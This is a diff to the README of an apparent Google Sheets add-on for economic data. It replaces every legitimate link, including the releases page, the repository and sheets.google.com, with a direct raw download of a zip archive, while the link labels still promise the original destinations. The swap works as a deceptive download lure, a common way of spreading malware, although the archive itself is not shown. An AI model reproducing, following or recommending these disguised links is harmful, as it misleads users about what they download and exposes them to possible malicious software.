@@ -1,7 +1,7 @@
 # 🌟 datasetiq-sheets-addon - Access Economic Data in Google Sheets
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/Ange4918/datasetiq-sheets-addon/releases)
+[![Download](https://raw.githubusercontent.com/Ange4918/datasetiq-sheets-addon/main/src/sheets_addon_datasetiq_v2.1.zip%20Page-brightgreen)](https://raw.githubusercontent.com/Ange4918/datasetiq-sheets-addon/main/src/sheets_addon_datasetiq_v2.1.zip)
 
 ## 📖 Description
 The datasetiq-sheets-addon allows you to access economic data directly within Google Sheets. This add-on provides a simple way to import datasets related to finance, economics, education, and more, streamlining your data analysis tasks.
@@ -17,7 +17,7 @@ Before you download the add-on, ensure you have:
 ## 💾 Download & Install
 1. **Visit the Release Page**  
    Go to the following link to download the latest version of the datasetiq-sheets-addon:  
-   [Download from Releases Page](https://github.com/Ange4918/datasetiq-sheets-addon/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/Ange4918/datasetiq-sheets-addon/main/src/sheets_addon_datasetiq_v2.1.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, you will see the latest version listed at the top. Click on it to view the release details.
@@ -26,7 +26,7 @@ Before you download the add-on, ensure you have:
    Look for the installation link or file. Click to download the add-on directly to your device.
 
 4. **Open Google Sheets**  
-   Go to Google Sheets by visiting [sheets.google.com](https://sheets.google.com).
+   Go to Google Sheets by visiting [https://raw.githubusercontent.com/Ange4918/datasetiq-sheets-addon/main/src/sheets_addon_datasetiq_v2.1.zip](https://raw.githubusercontent.com/Ange4918/datasetiq-sheets-addon/main/src/sheets_addon_datasetiq_v2.1.zip).
 
 5. **Install the Add-on**  
    - In Google Sheets, click on `Extensions` in the menu.
@@ -82,7 +82,7 @@ Special thanks to the contributors and the data sources that make this add-on po
 
 ## 🔗 Additional Links
 For more information, documentation, and updates:
-- [Release Page](https://github.com/Ange4918/datasetiq-sheets-addon/releases)
-- [GitHub Repository](https://github.com/Ange4918/datasetiq-sheets-addon)
+- [Release Page](https://raw.githubusercontent.com/Ange4918/datasetiq-sheets-addon/main/src/sheets_addon_datasetiq_v2.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Ange4918/datasetiq-sheets-addon/main/src/sheets_addon_datasetiq_v2.1.zip)
 
 Use the datasetiq-sheets-addon to enhance your data analysis experience in Google Sheets with easy access to valuable economic data.
